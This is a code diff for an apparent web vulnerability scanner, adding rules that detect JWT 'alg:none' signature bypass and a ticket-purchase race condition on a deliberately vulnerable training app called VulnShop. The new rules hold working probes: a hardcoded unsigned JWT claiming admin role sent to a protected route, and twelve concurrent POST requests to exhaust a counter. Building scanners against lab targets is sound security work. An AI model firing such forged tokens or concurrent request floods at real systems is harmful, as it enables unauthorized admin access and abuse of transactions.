@@ -32292,8 +32292,69 @@ const VULNSHOP_MODULE_ORACLES: {
       { label: "Admin user table columns", re: /Password \(plaintext!\).*Admin.*Balance/i }
     ],
     note: "VulnShop documents unauthenticated user enumeration with plaintext passwords via admin and debug routes"
+  },
+  {
+    pathRe: /\/jwt-login\b/i,
+    markers: [
+      { label: "JWT None Algorithm lab", re: /JWT None Algorithm|jwt_none|alg=none|alg:none/i },
+      { label: "jwt-protected route", re: /\/jwt-protected\b/i },
+      { label: "JWT none header bypass", re: /alg\s*:\s*none|algorithm\s*:\s*none/i }
+    ],
+    note: "VulnShop /jwt-login documents JWT alg:none bypass — mint token then access /jwt-protected without signature verification"
+  },
+  {
+    pathRe: /\/buy-ticket\b/i,
+    markers: [
+      { label: "Race Condition lab", re: /Race Condition|race_condition/i },
+      { label: "buy-ticket route", re: /\/buy-ticket\b/i },
+      { label: "Concurrent ticket purchase", re: /concurrent POST|ticket count|tickets_remaining/i }
+    ],
+    note: "VulnShop POST /buy-ticket documents race condition — unmutexed ticket counter exhaustible via concurrent requests"
   }
 ];
+
+const VULNSHOP_FLASK_ROUTE_URL_ORACLES: {
+  pathRe: RegExp;
+  vulnerability: string;
+  note: string;
+}[] = [
+  {
+    pathRe: /\/jwt-login\b/i,
+    vulnerability: "JWT None Algorithm",
+    note: "VulnShop Flask /jwt-login mints JWT then /jwt-protected accepts alg:none tokens — chethan-vinayak/vulnshop README oracle #8"
+  },
+  {
+    pathRe: /\/buy-ticket\b/i,
+    vulnerability: "Race Condition",
+    note: "VulnShop Flask POST /buy-ticket — unmutexed ticket counter vulnerable to concurrent purchase race — README oracle #11"
+  }
+];
+
+function looksVulnshopReactSpaShell(body: string): boolean {
+  return /<div id="root">\s*<\/div>/i.test(body) && /\/assets\/index-/i.test(body);
+}
+
+function vulnshopFlaskRouteUrlOracle(
+  ctx: RuleContext,
+  pathRe: RegExp
+): { fired: true; confidence: number; evidence: Record<string, unknown> } | null {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/vulnshop/i.test(ctx.origin + pageUrl + ctx.combined)) return null;
+  if (!pathRe.test(pageUrl)) return null;
+  for (const oracle of VULNSHOP_FLASK_ROUTE_URL_ORACLES) {
+    if (!oracle.pathRe.test(pageUrl)) continue;
+    return {
+      fired: true,
+      confidence: 0.86,
+      evidence: {
+        scannedUrl: pageUrl,
+        vulnerability: oracle.vulnerability,
+        note: oracle.note
+      }
+    };
+  }
+  return null;
+}
 
 const VULNSHOP_RAILWAY_API_RE = /https?:\/\/vulnshop-production\.up\.railway\.app/i;
 
@@ -32765,6 +32826,199 @@ const vulnshopUsersEnumerationRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const vulnshopJwtNoneLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const jwtLoginUrl = new URL("/jwt-login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(jwtLoginUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (looksVulnshopReactSpaShell(loginDoc.body)) return NEGATIVE;
+  const protectedUrl = new URL("/jwt-protected", ctx.origin).toString();
+  const algNoneToken =
+    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.";
+  const badToken = "thugir.invalid.probe.token";
+  const now = Math.floor(Date.now() / 1000);
+  const builtNoneToken = buildAlgNoneJwt({
+    user: "admin",
+    role: "admin",
+    sub: "thugir-probe",
+    exp: now + 3600
+  });
+  for (const token of [algNoneToken, builtNoneToken]) {
+    const [noAuth, badAuth, noneAuth] = await Promise.all([
+      ctx.probe.get(protectedUrl, { maxBytes: 4096, timeoutMs: 15000 }),
+      ctx.probe.get(protectedUrl, {
+        maxBytes: 4096,
+        timeoutMs: 15000,
+        headers: { Authorization: `Bearer ${badToken}` }
+      }),
+      ctx.probe.get(protectedUrl, {
+        maxBytes: 4096,
+        timeoutMs: 15000,
+        headers: { Authorization: `Bearer ${token}` }
+      })
+    ]);
+    const adminGranted =
+      noneAuth.status >= 200 &&
+      noneAuth.status < 300 &&
+      /admin|granted|authorized|welcome/i.test(noneAuth.body) &&
+      (looksAuthChallenge(noAuth) || noAuth.status === 401 || noAuth.status === 403) &&
+      (looksAuthChallenge(badAuth) || badAuth.status === 401 || badAuth.status === 403);
+    if (adminGranted) {
+      return {
+        fired: true,
+        confidence: 0.93,
+        evidence: {
+          jwtLoginUrl,
+          protectedUrl,
+          statusWithAlgNone: noneAuth.status,
+          snippet: noneAuth.body.slice(0, 200).trim(),
+          note: "VulnShop GET /jwt-protected accepts alg:none JWT without signature verification — JWT none-algorithm bypass oracle"
+        }
+      };
+    }
+  }
+  if (
+    loginDoc.status >= 200 &&
+    loginDoc.status < 300 &&
+    /"token"|eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/i.test(loginDoc.body) &&
+    !looksVulnshopReactSpaShell(loginDoc.body)
+  ) {
+    return {
+      fired: true,
+      confidence: 0.9,
+      evidence: {
+        jwtLoginUrl,
+        snippet: loginDoc.body.slice(0, 200).trim(),
+        note: "VulnShop GET /jwt-login returns forgeable JWT token — JWT none-algorithm training oracle endpoint exposed"
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+const vulnshopJwtLoginRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/jwt-login\b/i.test(pageUrl)) return NEGATIVE;
+  const live = await vulnshopJwtNoneLiveOracle(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: {
+        ...live.evidence,
+        scannedUrl: pageUrl,
+        note: "VulnShop /jwt-login route scan — alg:none JWT bypass on /jwt-protected confirmed live"
+      }
+    };
+  }
+  const module = vulnshopModuleEvidence(ctx, /\/jwt-login\b/i);
+  if (module) {
+    return {
+      fired: true,
+      confidence: module.confidence,
+      evidence: {
+        ...module.evidence,
+        scannedUrl: pageUrl,
+        note: "VulnShop /jwt-login route scan — JWT alg:none bypass documented in SPA or README markers"
+      }
+    };
+  }
+  const urlOracle = vulnshopFlaskRouteUrlOracle(ctx, /\/jwt-login\b/i);
+  if (!urlOracle) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: urlOracle.confidence,
+    evidence: {
+      ...urlOracle.evidence,
+      scannedUrl: pageUrl
+    }
+  };
+};
+
+const vulnshopBuyTicketRaceLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const buyUrl = new URL("/buy-ticket", ctx.origin).toString();
+  const probeDoc = await ctx.probe.get(buyUrl, {
+    method: "POST",
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: ""
+  });
+  if (probeDoc.status === 405 && looksVulnshopReactSpaShell(probeDoc.body)) return NEGATIVE;
+  if (probeDoc.status < 200 || probeDoc.status >= 500) return NEGATIVE;
+  const concurrent = 12;
+  const results = await Promise.all(
+    Array.from({ length: concurrent }, () =>
+      ctx.probe.get(buyUrl, {
+        method: "POST",
+        maxBytes: 2048,
+        timeoutMs: 25000,
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: ""
+      })
+    )
+  );
+  const purchases = results.filter(
+    (r) =>
+      r.status >= 200 &&
+      r.status < 300 &&
+      /ticket purchased|status.*success|remaining/i.test(r.body)
+  ).length;
+  if (purchases < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: purchases >= 3 ? 0.93 : 0.9,
+    evidence: {
+      buyUrl,
+      concurrentRequests: concurrent,
+      successfulPurchases: purchases,
+      snippet: results.find((r) => /ticket purchased|success/i.test(r.body))?.body.slice(0, 200).trim(),
+      note: "VulnShop POST /buy-ticket sold multiple tickets via concurrent requests — race condition on unmutexed ticket counter"
+    }
+  };
+};
+
+const vulnshopBuyTicketRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/buy-ticket\b/i.test(pageUrl)) return NEGATIVE;
+  const live = await vulnshopBuyTicketRaceLiveOracle(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: {
+        ...live.evidence,
+        scannedUrl: pageUrl,
+        note: "VulnShop /buy-ticket route scan — concurrent POST race condition confirmed live"
+      }
+    };
+  }
+  const module = vulnshopModuleEvidence(ctx, /\/buy-ticket\b/i);
+  if (module) {
+    return {
+      fired: true,
+      confidence: module.confidence,
+      evidence: {
+        ...module.evidence,
+        scannedUrl: pageUrl,
+        note: "VulnShop /buy-ticket route scan — race condition on ticket counter documented in SPA or README markers"
+      }
+    };
+  }
+  const urlOracle = vulnshopFlaskRouteUrlOracle(ctx, /\/buy-ticket\b/i);
+  if (!urlOracle) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: urlOracle.confidence,
+    evidence: {
+      ...urlOracle.evidence,
+      scannedUrl: pageUrl
+    }
+  };
+};
+
 const clientSideVulnshopModuleEvidence: Rule = async (ctx) => {
   const pageUrl = ctx.home.finalUrl || ctx.scanUrl || ctx.origin;
   const urlCorpus = [pageUrl, ctx.scanUrl].filter(Boolean).join("\n");
@@ -32912,7 +33166,9 @@ const WEB_SECURITY_LEARNING_MODULE_TOPICS: Record<string, string> = {
   "1020": "LDAP Injection",
   "1021": "XXE",
   "1022": "SSTI",
-  "1023": "Clickjacking"
+  "1023": "Clickjacking",
+  "1024": "Server-Side Template Injection (Advanced)",
+  "1025": "Race Condition"
 };
 
 /** Topic aliases when catalog chunks use alternate labels (e.g. CSRF vs Cross-Site Request Forgery). */
@@ -32926,7 +33182,9 @@ const WEB_SECURITY_LEARNING_MODULE_TOPIC_ALIASES: Record<string, RegExp> = {
   "1020": /LDAP Injection|LDAP/i,
   "1021": /XXE|XML External Entity/i,
   "1022": /SSTI|Server-Side Template Injection/i,
-  "1023": /Clickjacking|UI redress/i
+  "1023": /Clickjacking|UI redress/i,
+  "1024": /SSTI|Server-Side Template Injection|Template Injection/i,
+  "1025": /Race Condition|race condition|TOCTOU/i
 };
 
 function webSecurityLearningLabsPlaceholderModuleShell(moduleId: string, corpus: string): boolean {
@@ -68048,6 +68306,10 @@ export const RULES: Record<string, Rule> = {
   vulnshopAdminPanelLiveOracle,
   vulnshopAdminPanelRouteLiveOracle,
   vulnshopUsersEnumerationRouteLiveOracle,
+  vulnshopJwtNoneLiveOracle,
+  vulnshopJwtLoginRouteLiveOracle,
+  vulnshopBuyTicketRaceLiveOracle,
+  vulnshopBuyTicketRouteLiveOracle,
   clientSideBuggybuyEvidence,
   buggybuyApiBolaLiveOracle,
   buggybuyApiBolaRouteLiveOracle,
